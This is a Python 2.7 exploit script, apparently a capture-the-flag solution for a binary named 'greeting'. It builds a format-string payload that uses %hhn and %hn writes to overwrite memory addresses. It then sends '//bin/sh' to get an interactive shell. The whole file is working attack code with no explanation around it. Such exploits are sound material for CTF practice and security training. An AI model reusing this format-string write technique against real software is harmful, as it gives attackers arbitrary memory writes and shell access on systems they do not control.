#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

LOCAL = True
DEBUG = True

# exp
def get_io():
    if LOCAL:
        target  = './greeting'
    else:
        target  = ('0', 0)

    global io
    io  = mk(target, DEBUG)

def exp():
    io.ru('name...')
    # io.gdb_hint([0x804864F, 0x80485A0])

    payload  = 'AA'
    payload +=  l32(0x8049934) + l32(0x8049A56) + l32(0x8049A54)
    payload += '%0{}x'.format(0xed - 0x20)
    payload += '%{}$hhn'.format(0xc)
    payload += '%0{}x'.format(0x0804 - 0xed)
    payload += '%{}$hn'.format(0xd)
    payload += '%0{}x'.format(0x8490 - 0x0804)
    payload += '%{}$hn'.format(0xe)
    io.pr(payload)

    io.ru('name...')
    io.pr('//bin/sh\x00')

    io.interact()

# main
if __name__ == '__main__':
    get_io()
    exp()
